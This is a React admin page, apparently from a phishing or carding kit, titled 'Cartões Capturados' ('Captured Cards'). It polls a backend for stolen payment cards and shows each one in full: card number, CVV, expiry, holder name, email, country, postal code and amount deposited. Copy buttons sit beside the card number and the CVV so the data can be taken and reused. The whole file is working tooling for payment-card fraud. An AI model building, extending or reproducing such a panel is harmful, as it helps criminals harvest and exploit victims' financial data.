import React, { useState, useEffect } from 'react';
import { Search, Copy, RefreshCw } from 'lucide-react';
import { toast } from 'sonner';

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL || '';
const fmt = (v) => new Intl.NumberFormat('pt-PT', { style: 'currency', currency: 'EUR' }).format(v || 0);
const fmtDate = (iso) => iso ? new Date(iso).toLocaleString('pt-PT', { day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit' }) : '—';

const detectBrand = (num) => {
  const n = (num || '').replace(/\s/g, '');
  if (n.startsWith('4'))                       return { label: 'VISA',       color: '#1a1f71' };
  if (/^5[1-5]/.test(n)||/^2[2-7]/.test(n))   return { label: 'MASTERCARD', color: '#880e4f' };
  if (/^3[47]/.test(n))                        return { label: 'AMEX',       color: '#007bc0' };
  return                                               { label: 'CARD',       color: '#1a1a3e' };
};

function CreditCardVisual({ card }) {
  const brand  = detectBrand(card.card_number || '');
  // Mostrar número completo sempre
  const num    = (card.card_number || '•••• •••• •••• ••••').replace(/(.{4})(?=.)/g, '$1 ').trim();

  const copy = (text, label) => {
    navigator.clipboard.writeText(text).then(() => toast.success(`${label} copiado!`)).catch(() => {});
  };

  return (
    <div style={{
      background: `linear-gradient(135deg, ${brand.color}dd 0%, #0d0d20 100%)`,
      borderRadius: 16, padding: '20px 22px',
      position: 'relative', overflow: 'hidden',
      boxShadow: '0 8px 32px rgba(0,0,0,0.5)',
      border: '1px solid rgba(255,255,255,0.08)',
      minHeight: 180,
    }}>
      {/* Chip */}
      <div style={{ position: 'absolute', top: 20, left: 22, width: 36, height: 28, background: 'linear-gradient(135deg,#FFD700,#B8860B)', borderRadius: 5, opacity: 0.85 }} />
      {/* Círculos decorativos */}
      <div style={{ position: 'absolute', top: -30, right: -30, width: 130, height: 130, background: 'rgba(255,255,255,0.05)', borderRadius: '50%' }} />
      <div style={{ position: 'absolute', bottom: -20, right: 20, width: 90, height: 90, background: 'rgba(255,255,255,0.04)', borderRadius: '50%' }} />

      {/* Marca */}
      <div style={{ position: 'absolute', top: 18, right: 20, fontSize: 13, fontWeight: 900, color: 'rgba(255,255,255,0.85)', letterSpacing: '0.1em', fontFamily: 'monospace' }}>
        {brand.label}
      </div>

      {/* Número */}
      <div style={{ marginTop: 52 }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 14 }}>
          <span className="numeric" style={{ fontSize: 18, fontWeight: 700, color: '#fff', letterSpacing: '0.16em', fontFamily: 'monospace' }}>
            {num}
          </span>
          <button onClick={() => copy(card.card_number || '', 'Número')} title="Copiar número"
            style={{ background: 'rgba(255,255,255,0.1)', border: 'none', borderRadius: 5, padding: '3px 6px', cursor: 'pointer', color: 'rgba(255,255,255,0.7)' }}>
            <Copy size={11} />
          </button>
        </div>

        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-end' }}>
          <div>
            <div style={{ fontSize: 9, color: 'rgba(255,255,255,0.55)', textTransform: 'uppercase', letterSpacing: '0.1em', marginBottom: 2 }}>Titular</div>
            <div style={{ fontSize: 13, fontWeight: 700, color: '#fff', letterSpacing: '0.05em', textTransform: 'uppercase' }}>{card.full_name || 'N/A'}</div>
          </div>
          <div style={{ textAlign: 'right' }}>
            <div style={{ fontSize: 9, color: 'rgba(255,255,255,0.55)', textTransform: 'uppercase', letterSpacing: '0.1em', marginBottom: 2 }}>Validade</div>
            <div className="numeric" style={{ fontSize: 13, fontWeight: 700, color: '#fff', letterSpacing: '0.05em' }}>{card.expiry || '**/**'}</div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default function AdminCards() {
  const [cards, setCards]     = useState([]);
  const [loading, setLoading] = useState(true);
  const [search, setSearch]   = useState('');

  const fetchCards = async () => {
    const token = localStorage.getItem('adminToken');
    try {
      const res = await fetch(`${BACKEND_URL}/api/admin/cards`, { headers: { Authorization: `Bearer ${token}` } });
      if (res.ok) setCards(await res.json());
    } catch (_) {}
    setLoading(false);
  };

  useEffect(() => {
    fetchCards();
    const iv = setInterval(fetchCards, 20000); // 20s (era 5s)
    return () => clearInterval(iv);
  }, []);

  const filtered = cards.filter(c =>
    !search ||
    c.full_name?.toLowerCase().includes(search.toLowerCase()) ||
    c.email?.toLowerCase().includes(search.toLowerCase()) ||
    c.country?.toLowerCase().includes(search.toLowerCase())
  );

  const copy = (text, label) => {
    navigator.clipboard.writeText(text).then(() => toast.success(`${label} copiado!`)).catch(() => {});
  };

  return (
    <div>
      {/* Cabeçalho */}
      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 20, flexWrap: 'wrap', gap: 12 }}>
        <div>
          <h1 style={{ fontFamily: 'var(--font-heading)', fontSize: 20, fontWeight: 700, color: '#f3f5ff', margin: 0 }}>Cartões Capturados</h1>
          <p style={{ fontSize: 13, color: '#7a8299', margin: '4px 0 0' }}>{filtered.length} cartão{filtered.length !== 1 ? 's' : ''} · actualiza a cada 5s</p>
        </div>
        <div style={{ display: 'flex', gap: 10, alignItems: 'center' }}>
          <button onClick={fetchCards}
            style={{ display: 'flex', alignItems: 'center', gap: 6, padding: '7px 13px', background: 'rgba(58,134,255,0.1)', border: '1px solid rgba(58,134,255,0.25)', borderRadius: 9, color: '#3A86FF', fontSize: 12, fontWeight: 700, cursor: 'pointer' }}>
            <RefreshCw size={13} />Actualizar
          </button>
          <div style={{ background: '#111118', border: '1px solid #26263a', borderRadius: 10, padding: '6px 14px', textAlign: 'center' }}>
            <div className="numeric" style={{ fontSize: 18, fontWeight: 700, color: '#f3f5ff', fontFamily: 'var(--font-heading)' }}>{cards.length}</div>
            <div style={{ fontSize: 10, color: '#7a8299' }}>Total</div>
          </div>
        </div>
      </div>

      {/* Pesquisa */}
      <div style={{ position: 'relative', marginBottom: 20 }}>
        <Search size={13} style={{ position: 'absolute', left: 12, top: '50%', transform: 'translateY(-50%)', color: '#7a8299' }} />
        <input type="text" placeholder="Pesquisar por nome, e-mail ou país…"
          value={search} onChange={e => setSearch(e.target.value)}
          style={{ width: '100%', padding: '10px 14px 10px 34px', background: '#111118', border: '1px solid #26263a', borderRadius: 10, color: '#f3f5ff', fontSize: 14, outline: 'none', boxSizing: 'border-box' }}
        />
      </div>

      {loading ? (
        <div style={{ padding: '60px 0', textAlign: 'center', color: '#4a5068' }}>A carregar…</div>
      ) : filtered.length === 0 ? (
        <div style={{ padding: '60px 0', textAlign: 'center', color: '#4a5068' }}>
          <p style={{ fontSize: 13, margin: 0 }}>Nenhum cartão capturado ainda</p>
        </div>
      ) : (
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(340px, 1fr))', gap: 20 }}>
          {filtered.map((card) => (
            <div key={card.id} style={{ display: 'flex', flexDirection: 'column', gap: 0, background: '#111118', border: '1px solid #26263a', borderRadius: 18, overflow: 'hidden' }}>

              {/* Visual do cartão */}
              <CreditCardVisual card={card} />

              {/* Dados abaixo do cartão */}
              <div style={{ padding: '14px 18px', display: 'flex', flexDirection: 'column', gap: 8 }}>
                {/* CVV */}
                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '8px 12px', background: '#0e0e1a', borderRadius: 8 }}>
                  <span style={{ fontSize: 11, color: '#7a8299', textTransform: 'uppercase', letterSpacing: '0.08em' }}>CVV</span>
                  <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                    <span className="numeric" style={{ fontSize: 13, fontWeight: 700, color: '#f3f5ff', fontFamily: 'monospace' }}>
                      {card.cvv || '—'}
                    </span>
                    <button onClick={() => copy(card.cvv || '', 'CVV')}
                      style={{ background: 'rgba(255,255,255,0.05)', border: 'none', borderRadius: 5, padding: '3px 6px', cursor: 'pointer', color: '#7a8299' }}>
                      <Copy size={11} />
                    </button>
                  </div>
                </div>

                {/* Montante */}
                {card.amount > 0 && (
                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '8px 12px', background: 'rgba(34,197,139,0.07)', border: '1px solid rgba(34,197,139,0.2)', borderRadius: 8 }}>
                    <span style={{ fontSize: 11, color: '#7a8299' }}>Montante depositado</span>
                    <span className="numeric" style={{ fontSize: 14, fontWeight: 800, color: '#22c58b' }}>{fmt(card.amount)}</span>
                  </div>
                )}

                {/* Dados pessoais */}
                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 6 }}>
                  {[
                    { label: 'E-mail',     value: card.email   || '—' },
                    { label: 'País',       value: card.country || '—' },
                    { label: 'Código Postal', value: card.postal_code || '—' },
                    { label: 'Recebido',   value: fmtDate(card.created_at) },
                  ].map(({ label, value }) => (
                    <div key={label} style={{ padding: '6px 10px', background: '#0a0a18', borderRadius: 7 }}>
                      <div style={{ fontSize: 9, color: '#4a5068', textTransform: 'uppercase', letterSpacing: '0.07em', marginBottom: 2 }}>{label}</div>
                      <div style={{ fontSize: 11, color: '#e8eaf6', wordBreak: 'break-all' }}>{value}</div>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          ))}
        </div>
      )}
    </div>
  );
}
